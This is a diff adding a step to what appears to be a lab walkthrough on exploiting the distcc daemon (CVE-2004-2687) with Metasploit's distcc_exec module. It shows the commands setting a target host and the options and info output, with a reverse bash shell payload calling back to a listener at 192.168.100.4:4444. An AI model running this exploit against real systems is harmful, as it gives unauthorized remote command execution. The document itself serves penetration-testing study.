@@ -194,5 +194,93 @@ View the full module info with the info, or info -d command.
 msf6 exploit(unix/misc/distcc_exec) >
 ```
 
+The expolit used above is the distcc_exec vulneribilty, more information on the vulneribility regarding the CVE score and other details are avaialbale in the site: https://www.cvedetails.com/cve/CVE-2004-2687/
+
+distcc is a tool that enhances the compilation process by utilizing the idle processing power of other computers in the network. When distcc is set up on a machine, this machine is capable of distributing its compilation tasks to another system.
+
+Step 6 : Setting up the required parameters to run the exploit
+
+```
+msf6 exploit(unix/misc/distcc_exec) > set RHOST 192.168.100.7
+RHOST => 192.168.100.7
+msf6 exploit(unix/misc/distcc_exec) > options
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   192.168.100.7    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    3632             yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_bash):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.100.4    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+View the full module info with the info, or info -d command.
+```
+
+Info related to any exploit can be seen by running the info command
+
+```
+msf6 exploit(unix/misc/distcc_exec) > info
+
+       Name: DistCC Daemon Command Execution
+     Module: exploit/unix/misc/distcc_exec
+   Platform: Unix
+       Arch: cmd
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2002-02-01
+
+Provided by:
+  hdm <x@hdm.io>
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic Target
+
+Check supported:
+  Yes
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS  192.168.100.7    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT   3632             yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+
+Description:
+  This module uses a documented security weakness to execute
+  arbitrary commands on any system running distccd.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+  OSVDB (13378)
+  http://distcc.samba.org/security.html
+
+
+View the full module info with the info -d command.
+```
+
+
 
 
